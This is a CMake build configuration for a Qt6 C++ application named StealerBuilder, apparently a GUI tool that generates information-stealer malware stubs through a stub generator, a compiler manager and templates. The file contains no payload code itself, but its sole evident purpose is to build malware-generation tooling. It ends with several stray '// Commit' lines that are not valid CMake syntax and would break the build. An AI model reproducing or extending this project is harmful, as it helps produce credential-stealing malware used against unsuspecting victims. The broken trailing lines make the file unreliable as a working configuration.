cmake_minimum_required(VERSION 3.16)
project(StealerBuilder VERSION 1.0.0 LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_AUTOMOC ON)
set(CMAKE_AUTORCC ON)
set(CMAKE_AUTOUIC ON)

# Find Qt6
find_package(Qt6 REQUIRED COMPONENTS Core Widgets Network)

# Qt resource files
set(RESOURCE_FILES
    resources.qrc
)

# Source files
set(SOURCES
    src/main.cpp
    src/ui/mainwindow.cpp
    src/config/config.cpp
    src/generator/stubgenerator.cpp
    src/build/compilermanager.cpp
    src/build/builder.cpp
)

set(HEADERS
    src/ui/mainwindow.h
    src/config/config.h
    src/generator/stubgenerator.h
    src/build/compilermanager.h
    src/build/builder.h
)

# Create executable
add_executable(${PROJECT_NAME} ${SOURCES} ${HEADERS} ${RESOURCE_FILES})

# Link Qt libraries
target_link_libraries(${PROJECT_NAME} PRIVATE
    Qt6::Core
    Qt6::Widgets
    Qt6::Network
)

# Include directories
target_include_directories(${PROJECT_NAME} PRIVATE src)

# Install templates
install(DIRECTORY templates/ DESTINATION share/stealerbuilder/templates)

# Platform-specific settings
if(WIN32)
    set_target_properties(${PROJECT_NAME} PROPERTIES
        WIN32_EXECUTABLE TRUE
    )
endif()

# Set output directory
set_target_properties(${PROJECT_NAME} PROPERTIES
    RUNTIME_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/bin
)








// Commit 125 - 2025-02-07


// Commit 169 - 2025-05-27

// Commit 187 - 2025-07-09


// Commit 203 - 2025-08-15
